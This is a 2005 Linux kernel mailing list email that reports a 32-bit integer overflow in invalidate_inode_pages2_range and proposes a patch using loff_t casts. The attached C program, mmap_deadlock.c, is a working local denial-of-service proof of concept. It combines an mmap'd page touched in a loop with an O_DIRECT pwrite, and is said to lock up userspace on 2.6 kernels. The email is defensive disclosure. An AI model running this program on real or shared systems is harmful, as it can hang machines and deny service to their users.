Return-Path: <linux-kernel-owner+willy=40w.ods.org-S1750910AbVKWO6R@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1750910AbVKWO6R (ORCPT <rfc822;willy@w.ods.org>);
	Wed, 23 Nov 2005 09:58:17 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1750911AbVKWO6R
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Wed, 23 Nov 2005 09:58:17 -0500
Received: from linuxhacker.ru ([217.76.32.60]:40638 "EHLO shrek.linuxhacker.ru")
	by vger.kernel.org with ESMTP id S1750910AbVKWO6Q (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Wed, 23 Nov 2005 09:58:16 -0500
Date: Wed, 23 Nov 2005 16:57:27 +0200
From: Oleg Drokin <green@linuxhacker.ru>
To: linux-kernel@vger.kernel.org, akpm@osdl.org
Subject: 32bit integer overflow in invalidate_inode_pages2() (local DoS)
Message-ID: <20051123145727.GA21405@linuxhacker.ru>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="Qxx1br4bt0+wmkIi"
Content-Disposition: inline
User-Agent: Mutt/1.4.1i
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org


--Qxx1br4bt0+wmkIi
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hello!

   Today looking for a way to do atomic page-unmap + removing page from
   page cache, I found 32 bit integer overflow in invalidate_inode_pages2_range.
   Attached program demonstrates the problem (on x86 with 2.6.14
   I quickly get SOFT Lockup trace and after a few seconds entire
   userspace locks up (not sure why)).
   Seems that all 2.6 kernels are having same problem, 2.6.5 has similar
   (though not identical) code.

   Please consider this patch below:

--- linux-2.6.14/mm/truncate.c.orig	2005-11-23 16:34:21.000000000 +0200
+++ linux-2.6.14/mm/truncate.c	2005-11-23 16:37:18.000000000 +0200
@@ -291,8 +291,8 @@
 					 * Zap the rest of the file in one hit.
 					 */
 					unmap_mapping_range(mapping,
-					    page_index << PAGE_CACHE_SHIFT,
-					    (end - page_index + 1)
+					   (loff_t)page_index<<PAGE_CACHE_SHIFT,
+					   (loff_t)(end - page_index + 1)
 							<< PAGE_CACHE_SHIFT,
 					    0);
 					did_range_unmap = 1;
@@ -301,8 +301,8 @@
 					 * Just zap this page
 					 */
 					unmap_mapping_range(mapping,
-					  page_index << PAGE_CACHE_SHIFT,
-					  PAGE_CACHE_SIZE, 0);
+					  (loff_t)page_index<<PAGE_CACHE_SHIFT,
+					  PAGE_CACHE_SIZE, 0);
 				}
 			}
 			was_dirty = test_clear_page_dirty(page);


Bye,
    Oleg

--Qxx1br4bt0+wmkIi
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="mmap_deadlock.c"

#define _GNU_SOURCE
#define __USE_FILE_OFFSET64
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#define FILENAME "/tmp/bigfile"

int main(int argc, char **argv)
{
	int fd, fd1, ret;
	char *buf;
	char wbuf[8192];
	unsigned long long offset = 0xffffff000ULL;
	char *p=wbuf;

	fd = open(FILENAME, O_RDWR|O_CREAT|O_LARGEFILE/*|O_TRUNC*/, 0644);
	if (fd < 0) {
		perror(FILENAME);
		return -1;
	}

	ftruncate64(fd, offset + 4096*4);
	buf = mmap64(NULL, 4096*4, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offset);
	if (buf == MAP_FAILED) {
		perror("mmap");
		return -1;
	}

	fd1 = open(FILENAME, O_RDWR|O_DIRECT|O_LARGEFILE, 0644);
	if (fd < 0) {
		perror(FILENAME);
		return -1;
	}

	p = (char *)((unsigned long) p | 4095)+1;


	if (fork()) {
		while(1) {
			/* map in the page */
			buf[10] = 1;
		}
	} else {
		ret = pwrite64(fd1, p, 4096, offset);
		if (ret < 4096) {
			printf("write: %d %p\n", ret, p);
			perror("write");
			return -1;
		}
	}

	return 0;
}

--Qxx1br4bt0+wmkIi--
